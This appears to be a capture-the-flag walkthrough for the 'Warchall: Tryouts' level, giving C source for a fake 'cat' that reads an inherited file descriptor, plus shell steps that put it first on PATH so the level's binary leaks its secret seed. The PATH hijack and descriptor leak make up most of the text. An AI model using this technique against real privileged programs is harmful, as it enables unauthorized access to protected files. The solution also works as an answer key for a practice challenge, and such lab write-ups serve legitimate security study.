## Level 13 - Warchall: Tryouts

1. Create `cat.c` with the following content using `nano` or any text editor in the Home directory:
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main(int argc, char *argv[]) {
    FILE *fp = fopen(argv[1], "w");
    char buf[16];
    memset(buf, 0, sizeof buf);
    lseek(3, 0, SEEK_SET);
    read(3, buf, sizeof buf);
    fprintf(fp, "%s", buf);
    return 0;
}
```
2. Compile `cat.c`
```bash
gcc -m32 cat.c -o cat
```
3. Execute the compiled cat:

```bash
./cat
```
4.  Add the directory containing the `cat` binary to the `PATH` environment variable:
```bash
export PATH=$HOME:$PATH
```
5. Navigate to the directory where the `tryouts executable` is located:
```bash
cd /home/level/matrixman/13_tryouts
```
6. Run the `tryouts`
```bash
./tryouts
```
7. Interrupt the `tryouts` process using `Ctrl + C`.
8. View the contents of the `~/seed` file, the solution is there:
```bash
more ~/seed
```
